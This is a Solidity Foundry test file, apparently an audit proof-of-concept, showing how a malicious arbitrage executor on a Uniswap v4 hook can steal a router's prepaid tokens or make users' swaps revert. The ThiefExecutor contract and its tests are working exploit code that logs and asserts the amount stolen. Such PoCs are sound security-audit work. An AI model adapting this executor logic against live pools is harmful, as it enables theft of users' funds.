// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

import {IWETH} from "frontier/interfaces/IWETH.sol";
import {IWthArbitrageExecutor} from "contracts/wth-corrector/IWthArbitrageExecutor.sol";

import {WthCorrectorTest} from "../../wth-corrector/WthCorrector.t.sol";
import {PresyncRouterMock} from "../../wth-corrector/PresyncRouterMock.sol";

/// Executor that takes the router's pending coin settlement and restores the synced currency.
contract ThiefExecutor is IWthArbitrageExecutor {
    IPoolManager public immutable pm;
    IWETH public immutable weth;
    address public immutable corrector;
    uint256 public pay;
    uint256 public stolen;

    constructor(IPoolManager _pm, IWETH _weth, address _corrector) {
        pm = _pm;
        weth = _weth;
        corrector = _corrector;
    }

    receive() external payable {}

    function setPay(uint256 p) external {
        pay = p;
    }

    function executeArbitrage(PoolKey calldata key, address, ProfitSplit calldata) external returns (uint256) {
        // 1. settle with the router's pending sync: credited the router's transfer
        uint256 paid = pm.settle();
        // 2. take it out
        if (paid != 0) pm.take(key.currency1, address(this), paid);
        stolen = paid;
        // 3. restore the synced currency: reserves now equal the drained balance
        pm.sync(key.currency1);
        // 4. pay the minimum
        weth.deposit{value: pay}();
        weth.transfer(corrector, pay);
        return 0;
    }
}

/// Same as PresyncRouterMock, but tops up any unpaid coin debt after its settle.
contract TopUpRouter is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable poolManager;

    constructor(IPoolManager _pm) {
        poolManager = _pm;
    }

    receive() external payable {}

    function roundTrip(PoolKey memory plainKey, PoolKey memory frontierKey, uint256 coinIn) external {
        poolManager.unlock(abi.encode(plainKey, frontierKey, coinIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        (PoolKey memory plainKey, PoolKey memory frontierKey, uint256 coinIn) =
            abi.decode(data, (PoolKey, PoolKey, uint256));
        poolManager.sync(plainKey.currency1);
        IERC20(Currency.unwrap(plainKey.currency1)).transfer(address(poolManager), coinIn);
        BalanceDelta hop1 = poolManager.swap(
            plainKey,
            SwapParams({zeroForOne: false, amountSpecified: -int256(coinIn), sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1}),
            ""
        );
        uint256 ethGot = uint256(uint128(hop1.amount0()));
        BalanceDelta hop2 = poolManager.swap(
            frontierKey,
            SwapParams({zeroForOne: true, amountSpecified: -int256(ethGot), sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1}),
            ""
        );
        poolManager.settle();
        hop2;
        // settle whatever coin is still owed (open delta), then take any credit
        int256 d = poolManager.currencyDelta(address(this), frontierKey.currency1);
        if (d < 0) {
            poolManager.sync(frontierKey.currency1);
            IERC20(Currency.unwrap(frontierKey.currency1)).transfer(address(poolManager), uint256(-d));
            poolManager.settle();
        } else if (d > 0) {
            poolManager.take(frontierKey.currency1, address(this), uint256(d));
        }
        return "";
    }
}

contract ReservesPoCTest is WthCorrectorTest {
    function test_poc_presyncRouter_userSwapReverts() public {
        uint256 coinIn = 1_000_000 ether;
        PresyncRouterMock router = new PresyncRouterMock(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), coinIn);

        ThiefExecutor thief = new ThiefExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.deal(address(thief), 1 ether);
        thief.setPay(1e12);
        vm.prank(users.owner);
        corrector.setExecutor(address(thief));

        // the user's swap must always complete; here it does not
        vm.expectRevert(IPoolManager.CurrencyNotSettled.selector);
        router.roundTrip(plainKey, key, coinIn);
    }

    function test_poc_topUpRouter_userLosesCoinIn() public {
        uint256 coinIn = 1_000_000 ether;
        TopUpRouter router = new TopUpRouter(poolManager);
        vm.prank(users.buyerOne);
        wCoin.transfer(address(router), 2 * coinIn);
        uint256 start = wCoin.balanceOf(address(router));

        // baseline: paused corrector
        uint256 snap = vm.snapshot();
        vm.prank(users.owner);
        corrector.setExecutor(address(0));
        router.roundTrip(plainKey, key, coinIn);
        uint256 baseline = wCoin.balanceOf(address(router));
        vm.revertTo(snap);

        ThiefExecutor thief = new ThiefExecutor(poolManager, IWETH(address(weth)), address(corrector));
        vm.deal(address(thief), 1 ether);
        thief.setPay(1e12);
        vm.prank(users.owner);
        corrector.setExecutor(address(thief));

        router.roundTrip(plainKey, key, coinIn);
        uint256 got = wCoin.balanceOf(address(router));
        emit log_named_uint("router coin start            ", start);
        emit log_named_uint("router coin, paused corrector", baseline);
        emit log_named_uint("router coin, thief executor  ", got);
        emit log_named_uint("executor coin stolen         ", wCoin.balanceOf(address(thief)));
        assertEq(thief.stolen(), coinIn, "executor took the router's prepaid coin");
        assertEq(baseline - got, coinIn, "router short by coinIn");
    }
}
